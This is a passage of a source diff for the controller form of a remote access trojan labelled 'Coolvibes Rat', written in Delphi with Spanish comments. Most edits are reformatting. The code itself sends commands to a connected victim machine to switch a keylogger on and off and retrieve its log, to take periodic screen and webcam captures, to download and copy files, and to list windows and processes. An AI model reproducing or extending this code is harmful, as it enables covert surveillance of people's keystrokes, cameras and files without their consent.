-      Str1 := Item1.SubItems[Columna - 1];
-    if Item2.SubItems.Count < Columna then
-      Str2 := ''
-    else
-      Str2 := Item2.SubItems[Columna - 1];
-  end;
+    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
+      if Item1.SubItems.Count < Columna then
+        Str1 := ''
+      else
+        Str1 := Item1.SubItems[Columna - 1];
+      if Item2.SubItems.Count < Columna then
+        Str2 := ''
+      else
+        Str2 := Item2.SubItems[Columna - 1];
+    end;
 
-  if Item1.Caption = '<..>' then  //Siempre arriba
-  begin
-    Compare := Low(integer);  //El minimo valor posible de un Integer
-    exit;
-  end;
+  if Item1.Caption = '<..>' then //Siempre arriba
+    begin
+      Compare := Low(Integer); //El minimo valor posible de un Integer
+      Exit;
+    end;
   case Columna of
     0:
-    begin
-      Compare := CompareText(Str1, Str2);
-    end;
+      begin
+        Compare := CompareText(Str1, Str2);
+      end;
     1: Compare := ObtenerMejorUnidadInv(Str1) - ObtenerMejorUnidadInv(Str2);
     2: Compare := CompareText(Str1, Str2);
     3: Compare := CompareText(Str1, Str2);
@@ -3645,12 +3682,12 @@ end;
 procedure TFormControl.Iralproceso1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-  begin
-    if ListViewVentanas.Selected = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else                         //Recibe el PID de la ventana con Handle
-      Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
-  end
+    begin
+      if ListViewVentanas.Selected = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else //Recibe el PID de la ventana con Handle
+        Servidor.Connection.Writeln('WINPROC|' + ListViewVentanas.Selected.SubItems[0]);
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -3662,61 +3699,59 @@ begin
       SpinCaptureScreen.Value := 0;
     if SpinCaptureScreen.Value > 30 then
       SpinCaptureScreen.Value := 30;
-      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+{250}1;
+    TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
   except
   end;
 end;
 
-
 procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
 begin
   if Self.CheckBoxAutoCapturaScreen.Checked then
-  begin
-    BtnCapturarScreen.click; //Hacemos la primera captura
-  end;
+    begin
+      imgCaptura.Picture := nil; //Refrescamos
+      BtnCapturarScreen.Click; //Hacemos la primera captura
+    end;
 
-  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+{250}1;
-  TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
+  TimerCaptureScreen.Interval := SpinCaptureScreen.Value * 1000 + {250} 50;
+  TimerCaptureScreen.Enabled := CheckBoxAutoCapturaScreen.Checked;
   TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
 
-
 procedure TFormControl.Previsualizarjpg1Click(Sender: TObject);
 var
-  i: integer;
+  i: Integer;
   Descarga: TDescargaHandler;
-  FilePath: ansistring;
+  FilePath: AnsiString;
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
-  
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
+
   if PageControlArchivos.ActivePage = TabSheetVerArchivos then
     mslistviewitem := ListViewArchivos.Selected
   else
     mslistviewitem := ListViewBuscar.Selected;
 
   while Assigned(mslistviewitem) do
-  begin
-    if (FormVisorDeMiniaturas = nil) then
-      FormVisorDeMiniaturas := Tobject(TFormVisorDeMiniaturas.create(self,servidor,self));
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      FilePath := (EditPathArchivos.Text + mslistviewitem.Caption)
-    else
-      FilePath := mslistviewitem.subitems[0];
+    begin
+      if (FormVisorDeMiniaturas = nil) then
+        FormVisorDeMiniaturas := TObject(TFormVisorDeMiniaturas.Create(Self, servidor, Self));
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;
+      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+        FilePath := (EditPathArchivos.Text + mslistviewitem.Caption)
+      else
+        FilePath := mslistviewitem.subitems[0];
 
-    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
-    
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
-    else
-      mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
+      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
 
-  end;
+      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
+      else
+        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
 
+    end;
 
 end;
 
@@ -3727,7 +3762,7 @@ begin
       SpinCam.Value := 0;
     if SpinCam.Value > 30 then
       SpinCam.Value := 30;
-    TimerCamCapture.Interval := SpinCam.Value*1000+250;
+    TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
   except
   end;
 end;
@@ -3735,195 +3770,200 @@ end;
 procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
 begin
   if Self.CheckBoxAutoCamCapture.Checked then
-  begin
-    BtnCapturarWebcam.Click; //Hacemos la primera captura
-  end;
+    begin
+      imgWebcam.Picture := nil; //Refrescamos
+      BtnCapturarWebcam.Click; //Hacemos la primera captura
+    end;
 
-  TimerCamCapture.Interval := SpinCam.Value*1000+{250}1; //Mejor +1 para que vaya más rápido en local :p
-  TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
-	TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
+  TimerCamCapture.Interval := SpinCam.Value * 1000 + {250} 50;
+  TimerCamCapture.Enabled := CheckBoxAutoCamCapture.Checked;
+  TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
 
 procedure TFormControl.TimerCamCaptureTimer(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    self.TimerCamCapture.Enabled := False;
-    exit;
-  end;
-  BtnCapturarWebcam.click;
-  
+    begin
+      Self.TimerCamCapture.Enabled := False;
+      Exit;
+    end;
+  BtnCapturarWebcam.Click;
+
 end;
 
 procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
   Sender: TObject);
 begin
-  BtnRefrescarVentanas.click;
+  BtnRefrescarVentanas.Click;
 end;
 
-procedure TFormControl.agregardescarga(filename:string);
+procedure TFormControl.agregardescarga(FileName: string);
 var
-  i: integer;
+  i: Integer;
   Descarga: TDescargaHandler;
 begin
   //nos aseguramos de que el archivo no este en la lista de
   //descargas (sin importar si esta transfiriendo o si ya finalizo)
-    for i := 0 to ListViewDescargas.Items.Count - 1 do
+  for i := 0 to ListViewDescargas.Items.Count - 1 do
     begin
       Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
-      if Descarga.Origen = Filename then exit;
+      if Descarga.Origen = FileName then Exit;
     end;
-    Servidor.Connection.Writeln('GETFILE|' + filename);
+  Servidor.Connection.Writeln('GETFILE|' + FileName);
 end;
 
-procedure TFormControl.agregardescargaencola(filename:string;tamano:integer);
+procedure TFormControl.AgregarDescargaEnCola(FileName: string; tamano: Integer);
 var
-  i: integer;
-  Descarga,Descarga2: TDescargaHandler;
+  i: Integer;
+  Descarga, Descarga2: TDescargaHandler;
 begin
   //nos aseguramos de que el archivo no este en la lista de
   //descargas (sin importar si esta transfiriendo o si ya finalizo)
- 
-    for i := 0 to ListViewDescargas.Items.Count - 1 do
+
+  for i := 0 to ListViewDescargas.Items.Count - 1 do
     begin
       Descarga2 := TDescargaHandler(ListViewDescargas.Items[i].Data);
-      if Descarga2.Origen = Filename then exit;
+      if Descarga2.Origen = FileName then Exit;
     end;
-      CrearDirectoriosUsuario();
-      Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
-      DirDescargas +ExtractFileName(FileName), ListViewDescargas, True);
-      Descarga.callback := TransferFinishedNotification;
+  CrearDirectoriosUsuario();
+  Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
+    DirDescargas + ExtractFileName(FileName), ListViewDescargas, True);
+  Descarga.callback := TransferFinishedNotification;
 
 end;
 
 procedure TFormControl.CrearDirectoriosUsuario();
-  procedure Creadir(dir:string);
+
+  procedure Creadir(dir: string);
   var
-    tmp:string;
+    tmp: string;
   begin
-    while pos('\', dir) > 0 do
-    begin
-      tmp := tmp+Copy(dir, 1, Pos('\', dir));
-      Delete(dir, 1, Pos('\', dir));
-      if not directoryexists(tmp) then
-        CreateDirectory(pchar(tmp), nil);
-    end;
+    while Pos('\', dir) > 0 do
+      begin
+        tmp := tmp + Copy(dir, 1, Pos('\', dir));
+        Delete(dir, 1, Pos('\', dir));
+        if not directoryexists(tmp) then
+          CreateDirectory(PChar(tmp), nil);
+      end;
   end;
 begin
-    CreaDir(DirUsuario);
-    CreaDir(DirCapturas);
-    CreaDir(DirWebcam);
-    CreaDir(DirMiniaturas);
-    CreaDir(DirDescargas);
+  CreaDir(DirUsuario);
+  CreaDir(DirCapturas);
+  CreaDir(DirWebcam);
+  CreaDir(DirMiniaturas);
+  CreaDir(DirDescargas);
 end;
 
-procedure TFormControl.Guardarimagen1Click(Sender: TObject);
+procedure TFormControl.Guardarimagen1Click(Sender: TObject);
 begin
-  DlgGuardar.Title      := _('Guardar imagen ::Coolvibes::');
+  DlgGuardar.Title := _('Guardar imagen ::Coolvibes::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := _('Imagen')+' .Jpeg|*.jpg';
+  DlgGuardar.Filter := _('Imagen') + ' .Jpeg|*.jpg';
   DlgGuardar.DefaultExt := 'jpg';
   if DlgGuardar.Execute then
-  begin
-    if Pagecontrol.activepage = TabScreenCap then
-      //Se está guardando una captura
-      imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
-    else  //Sino es una webcam
-      imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
-    Estado(_('Imagen guardada como: ') + DlgGuardar.FileName);
-  end;
+    begin
+      if PageControlVigilancia.ActivePage = TabScreencap then
+        begin
+          //Se está guardando una captura
+          imgCaptura.Picture.SaveToFile(DlgGuardar.FileName);
+          ShowMessage('Pantalla');
+        end
+      else //Sino es una webcam
+        begin
+          imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
+          ShowMessage('Webcam');
+        end;
+      Estado(_('Imagen guardada como: ') + DlgGuardar.FileName);
+    end;
 end;
 
 procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
 var
-  popupPoint : TPoint;
+  PopupPoint: TPoint;
 begin
-  popupPoint.X := TSpeedButton(Sender).left;
-  popupPoint.Y := TSpeedButton(Sender).top;
-  popupPoint := ClientToScreen(popupPoint) ;
+  PopupPoint.X := TSpeedButton(Sender).Left;
+  PopupPoint.Y := TSpeedButton(Sender).Top;
+  PopupPoint := ClientToScreen(PopupPoint);
 
-  Popupguardarpantallaowebcam.popup(popupPoint.X, popupPoint.Y) ;
+  PopupGuardarPantallaoWebcam.Popup(PopupPoint.X, PopupPoint.Y);
 
 end;
 
 procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
 begin
-  if PageControlVigilancia.activepage = TabScreencap then
-  begin
-    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de pantalla');
-    if(PrefijoGuardarCaptura = '') then
-    begin
-      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
-      PopupGuardarPantallaoWebcam.items[1].checked := false;
+  if PageControlVigilancia.ActivePage = TabScreencap then
+    begin //Estamos en la pestaña Captura de Pantalla
+      PopupGuardarPantallaoWebcam.Items[0].Caption := _('Guardar captura de pantalla');
+      if (PrefijoGuardarCaptura = '') then
+        begin
+          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Activar guardado automático');
+          PopupGuardarPantallaoWebcam.Items[1].Checked := False;
+        end
+      else
+        begin
+          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Desactivar guardado automático');
+          PopupGuardarPantallaoWebcam.Items[1].Checked := True;
+        end;
     end
-    else
-    begin
-      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
-      PopupGuardarPantallaoWebcam.items[1].checked := true;
-    end;
-  end
   else
-  begin
-    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de webcam');
-    if(PrefijoGuardarWebcam = '') then
-    begin
-      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
-      PopupGuardarPantallaoWebcam.items[1].checked := false;
-    end
-    else
-    begin
-      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
-      PopupGuardarPantallaoWebcam.items[1].checked := true;
+    begin	//Estamos en la pestaña Captura de Webcam
+      PopupGuardarPantallaoWebcam.Items[0].Caption := _('Guardar captura de webcam');
+      if (PrefijoGuardarWebcam = '') then
+        begin
+          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Activar guardado automático');
+          PopupGuardarPantallaoWebcam.Items[1].Checked := False;
+        end
+      else
+        begin
+          PopupGuardarPantallaoWebcam.Items[1].Caption := _('Desactivar guardado automático');
+          PopupGuardarPantallaoWebcam.Items[1].Checked := True;
+        end;
     end;
-  end;
 end;
 
 procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
 begin
-if((PrefijoGuardarCaptura = '') and (PageControlVigilancia.activepage = TabScreencap)) then
-    PrefijoGuardarCaptura := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('captura_'))
-else
-if((PrefijoGuardarWebcam = '') and (PageControlVigilancia.activepage = TabWebcam)) then
-    PrefijoGuardarWebcam := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('webcam_'))
-else
-if((PrefijoGuardarCaptura <> '') and (PageControlVigilancia.activepage = TabScreencap)) then
+  if ((PrefijoGuardarCaptura = '') and (PageControlVigilancia.ActivePage = TabScreencap)) then
+    PrefijoGuardarCaptura := InputBox(_('Prefijo captura'), _('Prefijo captura'), _('captura_'))
+  else if ((PrefijoGuardarWebcam = '') and (PageControlVigilancia.ActivePage = TabWebcam)) then
+    PrefijoGuardarWebcam := InputBox(_('Prefijo captura'), _('Prefijo captura'), _('webcam_'))
+  else if ((PrefijoGuardarCaptura <> '') and (PageControlVigilancia.ActivePage = TabScreencap)) then
     PrefijoGuardarCaptura := ''
-else
-if((PrefijoGuardarWebcam <> '') and (PageControlVigilancia.activepage = TabWebcam)) then
+  else if ((PrefijoGuardarWebcam <> '') and (PageControlVigilancia.ActivePage = TabWebcam)) then
     PrefijoGuardarWebcam := '';
 end;
 
 procedure TFormControl.TabKeyloggerShow(Sender: TObject);
 begin
-  if(not ProgressBarKeylogger.enabled) then  //al mostrarnos por primera vez
-  begin
-    SpeedButtonRecibirLog.enabled := false;  //no se ponen deshabilitados desde el principio porque dan error: Controlador no valido
-    EditLogName.enabled := false;
-    SpeedButtonGuardarLog.enabled := false;
-    SpeedButtonActivarKeylogger.enabled := false;
-    SpeedButtonEliminarLog.enabled := false;
-    Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
-  end;
+  if (not ProgressBarKeylogger.Enabled) then //al mostrarnos por primera vez
+    begin
+      SpeedButtonRecibirLog.Enabled := False; //no se ponen deshabilitados desde el principio porque dan error: Controlador no valido
+      EditLogName.Enabled := False;
+      SpeedButtonGuardarLog.Enabled := False;
+      SpeedButtonActivarKeylogger.Enabled := False;
+      SpeedButtonEliminarLog.Enabled := False;
+      Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
+    end;
 end;
 
 procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
 begin
-  if not Servidor.Connection.Connected then exit;
-  if not SpeedbuttonRecibirlog.enabled then exit;
-  SpeedButtonRecibirLog.enabled := false;  
+  if not Servidor.Connection.Connected then Exit;
+  if not SpeedbuttonRecibirlog.Enabled then Exit;
+  SpeedButtonRecibirLog.Enabled := False;
   Servidor.connection.WriteLn('RECIBIRKEYLOGGER');
 end;
 
 procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
 begin
-  SpeedButtonActivarKeylogger.enabled := false;
-  if(SpeedButtonActivarKeylogger.caption = _('Activar Keylogger')) then
-  begin
-    if(EditLogName.text <> '') then
-      Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|'+EditLogName.text+'|')
-    else
-      SpeedButtonActivarKeylogger.enabled := true;
-  end
+  SpeedButtonActivarKeylogger.Enabled := False;
+  if (SpeedButtonActivarKeylogger.Caption = _('Activar Keylogger')) then
+    begin
+      if (EditLogName.Text <> '') then
+        Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|' + EditLogName.Text + '|')
+      else
+        SpeedButtonActivarKeylogger.Enabled := True;
+    end
   else
     Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');
 
@@ -3931,115 +3971,116 @@ end;
 
 procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
 begin
- Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
+  Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
 end;
 
 procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
-function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
+
+  function BooleanToStr(Bool: Boolean; TrueString, FalseString: string): string;
+  begin
+    if Bool then
+      Result := TrueString
+    else
+      Result := FalseString;
+  end;
 begin
-  if Bool then
-    Result := TrueString
-  else
-    Result := FalseString;
-end;
-begin
-  if not Servidor.Connection.Connected then exit;
-  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|'+BooleanToStr(CheckBoxOnlineKeylogger.checked,'ACTIVAR','DESACTIVAR')+'|');
+  if not Servidor.Connection.Connected then Exit;
+  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|' + BooleanToStr(CheckBoxOnlineKeylogger.Checked, 'ACTIVAR', 'DESACTIVAR') + '|');
 end;
 
 procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
 begin
-  DlgGuardar.Title      := _('Guardar Log de Keylogger ::Coolvibes Rat::');
+  DlgGuardar.Title := _('Guardar Log de Keylogger ::Coolvibes Rat::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := _('Texto .txt');
+  DlgGuardar.Filter := _('Texto .txt');
   DlgGuardar.DefaultExt := 'txt';
   if DlgGuardar.Execute then
-  begin 
-    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
-    RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);
+    begin
+      RichEditKeylogger.plaintext := True; //Se guarda como archivo de texto plano
+      RichEditKeylogger.Lines.savetofile(DlgGuardar.FileName);
 
-    Estado(_('Log guardado como: ') + DlgGuardar.FileName);
-  end;
+      Estado(_('Log guardado como: ') + DlgGuardar.FileName);
+    end;
 end;
 
 procedure TFormControl.TabServidorShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-    BtnActualizarServidorInfo.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnActualizarServidorInfo.Click;
 end;
 
 procedure TFormControl.TabVentanasShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnRefrescarVentanas.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnRefrescarVentanas.Click;
 end;
 
 procedure TFormControl.TabServiciosShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnServicios.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    BtnServicios.Click;
 end;
 
 procedure TFormControl.TabScreencapShow(Sender: TObject);
 begin
   if Servidor.Connection.connected then
-  Servidor.Connection.Writeln('DATOSCAPSCREEN');
-  
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-  begin
-    BtnCapturarScreen.click;
-  end;
+    Servidor.Connection.Writeln('DATOSCAPSCREEN');
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
+    begin
+      imgCaptura.Picture := nil; //Refrescamos
+      BtnCapturarScreen.Click;
+    end;
 end;
 
 procedure TFormControl.TabWebcamShow(Sender: TObject);
 begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) and (ComboboxWebcam.text = '') then
-    BtnObtenerWebcams.click;
+  if (FormOpciones.CheckBoxAutoRefrescar.Checked) and (ComboboxWebcam.Text = '') then
+    BtnObtenerWebcams.Click;
 end;
 
 procedure TFormControl.CheckBoxTamanioRealClick(Sender: TObject);
 begin
-  if CheckBoxTamanioReal.checked then
-  begin
-    imgcaptura.align := alnone;
-    imgCaptura.height := alturapantalla;   //La anchura se calcula sola al recibir la captura
-  end
+  if CheckBoxTamanioReal.Checked then
+    begin
+      imgcaptura.align := alNone;
+      imgCaptura.Height := alturapantalla; //La anchura se calcula sola al recibir la captura
+    end
   else
-  begin
-    imgcaptura.align := alLeft;
-  end;
-  BtnCapturarScreen.click;
+    begin
+      imgcaptura.align := alLeft;
+    end;
+  BtnCapturarScreen.Click;
 end;
 
 procedure TFormControl.PrevisualizarImagenes1Click(Sender: TObject);
 begin
-  PrevisualizarImagenes1.checked := not PrevisualizarImagenes1.checked;
-  PrevisualizacionActiva := PrevisualizarImagenes1.checked;
+  PrevisualizarImagenes1.Checked := not PrevisualizarImagenes1.Checked;
+  PrevisualizacionActiva := PrevisualizarImagenes1.Checked;
 
-  if PrevisualizacionActiva then   //iconos grades
-  begin
-    Listviewarchivos.viewstyle := vsIcon;
-  end
+  if PrevisualizacionActiva then //iconos grades
+    begin
+      Listviewarchivos.viewstyle := vsIcon;
+    end
   else
-  begin
-    Listviewarchivos.viewstyle := vsReport;
-  end;
+    begin
+      Listviewarchivos.viewstyle := vsReport;
+    end;
 
-  BtnActualizarArchivos.click;
+  BtnActualizarArchivos.Click;
 end;
 
 procedure TFormControl.Copiar1Click(Sender: TObject);
 begin
 
   if Servidor.Connection.Connected then
-  begin
-    mslistviewitem := ListViewArchivos.Selected;
-    while Assigned(mslistviewitem) do
     begin
-      PortaPapeles := Portapapeles+EditPathArchivos.text+mslistviewitem.caption+'|';
-      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-    end;
-  end
+      mslistviewitem := ListViewArchivos.Selected;
+      while Assigned(mslistviewitem) do
+        begin
+          PortaPapeles := Portapapeles + EditPathArchivos.Text + mslistviewitem.Caption + '|';
+          mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
@@ -4047,284 +4088,281 @@ end;
 
 procedure TFormControl.Pegar1Click(Sender: TObject);
 var
-  tmp : string;
+  tmp: string;
 begin
-  while pos('|',portapapeles) > 0 do
-  begin
-    tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
-    Delete(portapapeles, 1, Pos('|', PortaPapeles));
-    Servidor.Connection.Writeln('COPYF|'+tmp+'|'+EditPathArchivos.Text +extractfilename(tmp)+'|');
-  end;
+  while Pos('|', portapapeles) > 0 do
+    begin
+      tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
+      Delete(portapapeles, 1, Pos('|', PortaPapeles));
+      Servidor.Connection.Writeln('COPYF|' + tmp + '|' + EditPathArchivos.Text + extractfilename(tmp) + '|');
+    end;
   btnactualizararchivos.Click;
 end;
 
-procedure TFormControl.CargarThumbsFileAlListview(thumbsfilepath:string);
+procedure TFormControl.CargarThumbsFileAlListview(thumbsfilepath: string);
 var
-    ThumbsDBFile:TStorage;       //TStorage for thumbs.db file
-    ThumbsDBCatalog:TStream;     //TStream for file catalog inside thumbs.db
-    ThumbsDB_JPEG:tstream;       //stream for thumb image inside thumbs.db
-    ThmInfo:TAxThumbsDBFileInfo; //info structure for each item in thumbs.db
-    i,j,o:dword;                   //indexes
-    Filename:string;             //Filename read from catalog
-    WideChr:word;                //placeholder to read widechar filename
-    dwIndex:dword;               //placeholder to calculate item names
-    IndexStr:string;             //name of TStorage item for each catalog item
-    ThumbnailItems:tstringlist;
-    FCatalogSignatur:dword;   //unknown dword with value 00 07 00 10 hex
-    FCatalogItemCount:dword;  //number of items in catalog
-    FCatalogThumbSize:TSize;  //max. size of thumbnails
-    bit,nbit: Tbitmap;
-    tmpint,tmpint2 : integer;
-    imglist : Timagelist;
-    t : integer;
+  ThumbsDBFile: TStorage; //TStorage for thumbs.db file
+  ThumbsDBCatalog: TStream; //TStream for file catalog inside thumbs.db
+  ThumbsDB_JPEG: TStream; //stream for thumb image inside thumbs.db
+  ThmInfo: TAxThumbsDBFileInfo; //info structure for each item in thumbs.db
+  i, j, o: dword; //indexes
+  FileName: string; //Filename read from catalog
+  WideChr: Word; //placeholder to read widechar filename
+  dwIndex: dword; //placeholder to calculate item names
+  IndexStr: string; //name of TStorage item for each catalog item
+  ThumbnailItems: TStringList;
+  FCatalogSignatur: dword; //unknown dword with value 00 07 00 10 hex
+  FCatalogItemCount: dword; //number of items in catalog
+  FCatalogThumbSize: TSize; //max. size of thumbnails
+  bit, nbit: Tbitmap;
+  tmpint, tmpint2: Integer;
+  imglist: Timagelist;
+  t: Integer;
 begin
-  listviewarchivos.items.beginupdate;
-  cargariconos(false);
+  listviewarchivos.Items.beginupdate;
+  cargariconos(False);
   ThumbnailItems := TStringList.Create;
-  imglist := Timagelist.create(nil);
-  imglist.Width := Iconosgrandes.width;
+  imglist := Timagelist.Create(nil);
+  imglist.Width := Iconosgrandes.Width;
   imglist.Height := Iconosgrandes.Height;
-  ThumbsDBFile := TStgFile.OpenFile(thumbsfilepath, STGM_READ or STGM_SHARE_EXCLUSIVE );
+  ThumbsDBFile := TStgFile.OpenFile(thumbsfilepath, STGM_READ or STGM_SHARE_EXCLUSIVE);
   try
     //open catalog of files inside thumbs.db
-    ThumbsDBCatalog := ThumbsDBFile.OpenStream( 'Catalog', STGM_READ or STGM_SHARE_EXCLUSIVE );
+    ThumbsDBCatalog := ThumbsDBFile.OpenStream('Catalog', STGM_READ or STGM_SHARE_EXCLUSIVE);
     try
       //read catalog
       //first dword = ??? always 00070010 hex
-      ThumbsDBCatalog.Read(FCatalogSignatur,4);
+      ThumbsDBCatalog.read(FCatalogSignatur, 4);
       //second dword = number of items
-      ThumbsDBCatalog.Read(FCatalogItemCount,4);
+      ThumbsDBCatalog.read(FCatalogItemCount, 4);
       //dword 3+4 = size of thumbs, not used
-      ThumbsDBCatalog.Read(FCatalogThumbSize,8);
+      ThumbsDBCatalog.read(FCatalogThumbSize, 8);
 
       for i := 0 to FCatalogItemCount - 1 do
-      begin
-        ThmInfo := TAxThumbsDBFileInfo.Create;
-
-        //first dword = ??? always 2x000000 hex
-        ThumbsDBCatalog.Read(ThmInfo.dwFirstDummy,4);
-        //second dword = index of item
-        ThumbsDBCatalog.Read(ThmInfo.dwIndex,4);
-        //dword 3+4 date and time ???
-        ThumbsDBCatalog.Read(ThmInfo.dwFileDate,4);
-        //second dword = index of item
-        ThumbsDBCatalog.Read(ThmInfo.dwThumbDate,4);
-
-        //read filename as widechar and convert to string
-        Filename := '';
-        repeat
-          ThumbsDBCatalog.Read(WideChr,2);
-          if WideChr <> 0 then
-          begin
-            Filename := Filename + char(WideChr);
-          end;
-        until WideChr = 0;
-        //additional 00 00 word at each item end
-        ThumbsDBCatalog.Read(WideChr,2);
-
-        //calculate name of item from catalog index
-        //for any unknown reason, the name is calculated from index as
-        // inttostr(1. digit) + inttostr(2. digit) + ... (reverse order)
-        IndexStr := '';
-        dwIndex := ThmInfo.dwIndex;
-        while dwIndex > 0 do
         begin
-          j := dwIndex mod 10;
-          IndexStr := IndexStr + IntToStr(j);
-          dwIndex := dwIndex div 10;
-        end;
+          ThmInfo := TAxThumbsDBFileInfo.Create;
 
-        //read thumbnail as JPEG file
-        ThmInfo.jpgThumb := TJPEGImage.Create;
-        ThumbsDB_JPEG := ThumbsDBFile.OpenStream(IndexStr, STGM_READ or STGM_SHARE_EXCLUSIVE );
-        try
-          //12 bytes in from of JPEG stream
-          ThumbsDB_JPEG.Read(ThmInfo.dwUnknown1,4);
-          ThumbsDB_JPEG.Read(ThmInfo.dwUnknown1,4);
-          ThumbsDB_JPEG.Read(ThmInfo.dwSizeOfJPGStream,4);
+          //first dword = ??? always 2x000000 hex
+          ThumbsDBCatalog.read(ThmInfo.dwFirstDummy, 4);
+          //second dword = index of item
+          ThumbsDBCatalog.read(ThmInfo.dwIndex, 4);
+          //dword 3+4 date and time ???
+          ThumbsDBCatalog.read(ThmInfo.dwFileDate, 4);
+          //second dword = index of item
+          ThumbsDBCatalog.read(ThmInfo.dwThumbDate, 4);
 
-          //read stream as JPEG and store in thumb info structure
-          try
-            ThmInfo.jpgThumb.LoadFromStream(ThumbsDB_JPEG);
-          except
-          end;
+          //read filename as widechar and convert to string
+          FileName := '';
+          repeat
+            ThumbsDBCatalog.read(WideChr, 2);
+            if WideChr <> 0 then
+              begin
+                FileName := FileName + char(WideChr);
+              end;
+          until WideChr = 0;
+          //additional 00 00 word at each item end
+          ThumbsDBCatalog.read(WideChr, 2);
 
-           for o := 0 to listviewarchivos.items.count-1 do
-           begin
